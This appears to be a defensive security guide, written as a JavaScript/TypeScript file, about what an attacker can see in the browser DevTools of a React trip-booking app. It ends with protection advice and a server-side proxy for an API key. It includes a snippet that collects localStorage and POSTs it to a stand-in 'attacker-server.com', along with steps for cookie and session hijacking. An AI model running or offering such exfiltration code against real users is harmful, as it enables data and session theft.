/**
 * 👀 WHAT HACKERS CAN SEE IN YOUR BROWSER
 * 
 * Visual walkthrough of security vulnerabilities
 */

// ============================================================================
// 🔍 INSPECT TAB → ELEMENTS (HTML/DOM)
// ============================================================================

// Hacker opens F12 → Elements/Inspector

// What they can see:
// ✅ HTML structure (harmless)
// ⚠️ HTML attributes with data (potentially harmful)
// ⚠️ React component props visible in source

// EXAMPLE FROM YOUR CODE:
/* 
  <TripCard 
    trip={{
      id: "trip-123",
      title: "Kasol Trip",
      destination: "Kasol, HP",
      price: 15000,
      itinerary: [...]
    }}
  />
*/
// ✅ This is OK - it's public trip data


// ============================================================================
// 🖥️ INSPECT TAB → CONSOLE (JavaScript Execution)
// ============================================================================

// Hacker opens F12 → Console
// They can execute any JavaScript!

// WHAT THEY CAN STEAL:

// 1️⃣ LocalStorage Data
console.log('=== ATTACKER STEALS LOCALSTORAGE ===');
console.log(localStorage);
// Output: {
//   geocode_kasol: '{"lat":32.2264,"lon":77.4686,...}',
//   geocode_new_delhi: '{"lat":28.5921,"lon":77.2064,...}',
//   user_preferences: '{"tripHistory":[...]}'
// }
// ← ATTACKER KNOWS YOUR TRIP PLANS!


// 2️⃣ Cookies
console.log('=== ATTACKER STEALS COOKIES ===');
console.log(document.cookie);
// Output: session_id=abc123def456; auth_token=xyz789
// ← ATTACKER CAN HIJACK YOUR SESSION!


// 3️⃣ API Keys from Environment (if exposed)
console.log('=== ATTACKER FINDS API KEYS ===');
console.log(import.meta.env);
// Output: {
//   VITE_GEOAPIFY_API_KEY: "ea1234567890abc",
//   VITE_TURNSTILE_SITE_KEY: "0x1234567890...",
// }
// ← ATTACKER HAS YOUR API KEYS!


// 4️⃣ React Component State (with DevTools)
// Attacker installs React DevTools → can inspect:
// - Component state (user data, form inputs)
// - Props (trip data, user preferences)
// - Event handlers (can trigger them)


// 5️⃣ Execute Malicious JavaScript
console.log('=== ATTACKER RUNS CUSTOM CODE ===');

// Steal all localStorage
const allData = {};
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  allData[key] = localStorage.getItem(key);
}

// Send to their server
fetch('https://attacker-server.com/steal', {
  method: 'POST',
  body: JSON.stringify(allData)
});
// ← YOUR DATA IS NOW ON ATTACKER'S SERVER!


// ============================================================================
// 📡 NETWORK TAB (API Calls & Responses)
// ============================================================================

// Hacker opens F12 → Network tab
// They see EVERY network request and response!

// FROM YOUR CODE - WHAT THEY SEE:

// REQUEST #1: Geoapify Geocoding (with exposed API key!)
GET https://api.geoapify.com/v1/geocode/search?text=kasol&apiKey=ea1234567890abc
// ← API KEY IS VISIBLE IN URL! ATTACKER COPIES IT!

// REQUEST #2: Turnstile Token Submission
POST /api/forms/contact
{
  "email": "user@gmail.com",
  "message": "I want to book a trip",
  "turnstileToken": "0.abc123xyz789=="
}
// Response:
{
  "success": true,
  "submissionId": "sub_123"
}

// REQUEST #3: Trip Data
GET /api/trips?destination=kasol&days=5
// Response:
[
  {
    "id": "trip-123",
    "title": "Kasol Trip",
    "destination": "Kasol",
    "price": 15000,
    "stops": [...],  // All your trip details!
  }
]


// ============================================================================
// 💾 APPLICATION TAB → LocalStorage / SessionStorage / Cookies
// ============================================================================

// Hacker opens F12 → Application → Storage

// LocalStorage Tab:
// - geocode_kasol: {"lat":32.2264,"lon":77.4686,"formatted":"Kasol, India"}
// - geocode_delhi: {"lat":28.5921,"lon":77.2064}
// - user_preferences: {"budget":50000,"interests":["trekking","photography"]}
// ← ALL YOUR LOCATION DATA VISIBLE!

// Cookies Tab:
// - session_id: abc123def456gh789
// - auth_token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
// - preferences: theme=dark&language=en
// ← SESSION CAN BE HIJACKED!


// ============================================================================
// 🌐 REACT DEVTOOLS (Component Inspector)
// ============================================================================

// Hacker installs React DevTools browser extension
// Opens F12 → React Components

// Can see your entire component tree:
// <App>
//   <HomePage>
//     <TripCard {...props}>
//       trip: {
//         id: "trip-123",
//         title: "Kasol",
//         destination: "Kasol, HP",
//         price: 15000,
//         itinerary: [...]  ← Can view all details
//       }
//       onBook: (trip) => {...}  ← Can see function logic
//     </TripCard>
//   </HomePage>
// </App>

// PROBLEM: If you store sensitive data in React state:
// const [userLocation, setUserLocation] = useState({
//   latitude: 28.5921,
//   longitude: 77.2064,
//   address: "My Home",
// });
// ← Hacker can see exact home location!


// ============================================================================
// 📊 REAL ATTACK SCENARIO
// ============================================================================

/*
STEP 1: Hacker identifies your API key
  - Opens DevTools → Network tab
  - Sees: https://api.geoapify.com/v1/geocode/search?apiKey=ea1234567890abc
  - Copies API key

STEP 2: Hacker uses YOUR API key
  - Makes thousands of requests to Geoapify API
  - YOUR account gets charged for all requests
  - Bill could be $100s-$1000s

STEP 3: Hacker extracts user data
  - Opens Console
  - Runs: JSON.parse(localStorage.getItem('geocode_kasol'))
  - Gets: {lat: 32.2264, lon: 77.4686, formatted: "Kasol"}
  - Knows your trip destinations

STEP 4: Hacker steals session token
  - Opens DevTools → Storage → Cookies
  - Copies: session_id=abc123def456
  - Can now log in as you
  - Access your booking history, preferences, payment info

STEP 5: Hacker sells stolen data
  - Sells API key to other hackers
  - Sells user location data to data brokers
  - Your privacy is compromised!
*/


// ============================================================================
// ✅ WHAT SHOULD BE VISIBLE
// ============================================================================

// Only this information should be in browser:
// ✅ Public trip data (title, description, price)
// ✅ User-provided data (their own name, preferences)
// ✅ Non-sensitive app state (selected filter, page number)

// This should NEVER be visible:
// ❌ API keys
// ❌ Tokens (or tokens with short expiry)
// ❌ User location data
// ❌ Payment information
// ❌ Passwords
// ❌ Personal identifiable information (PII)


// ============================================================================
// 🛡️ HOW TO PROTECT YOUR APP
// ============================================================================

// 1. Move API keys to server-side only
// 2. Use HTTPS (encrypt data in transit)
// 3. Set Content-Security-Policy headers
// 4. Encrypt sensitive data in localStorage
// 5. Clear tokens after use
// 6. Use httpOnly cookies (can't be accessed by JavaScript)
// 7. Implement CORS properly
// 8. Never log sensitive data
// 9. Disable React DevTools in production
// 10. Use environment variables for secrets (server-side)


// ============================================================================
// 🔐 EXAMPLE: SECURE IMPLEMENTATION
// ============================================================================

// ❌ BEFORE (INSECURE):
export async function getTrips(destination: string) {
  const apiKey = import.meta.env.VITE_GEOAPIFY_API_KEY;  // ← EXPOSED!
  
  const response = await fetch(
    `https://api.geoapify.com/v1/geocode/search?` +
    `text=${destination}&apiKey=${apiKey}`  // ← IN URL!
  );
  
  return response.json();
}

// ✅ AFTER (SECURE):
export async function getTrips(destination: string) {
  // Call YOUR server (no API key exposed)
  const response = await fetch('/api/get-trips', {
    method: 'POST',
    body: JSON.stringify({ destination })
  });
  
  return response.json();
}

// Server-side only (/api/get-trips.ts):
export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { destination } = req.body;
  
  // Secret key only on server
  const apiKey = process.env.GEOAPIFY_API_KEY;  // ← NEVER exposed to browser
  
  // Make request with secret key (browser never sees it)
  const response = await fetch(
    `https://api.geoapify.com/v1/geocode/search?` +
    `text=${destination}&apiKey=${apiKey}`
  );
  
  const data = await response.json();
  
  // Return only what's needed
  res.json({
    destination: data.features[0].properties.formatted,
    coordinates: {
      lat: data.features[0].geometry.coordinates[1],
      lon: data.features[0].geometry.coordinates[0]
    }
  });
}


export default 'SECURITY_VISIBILITY_GUIDE';
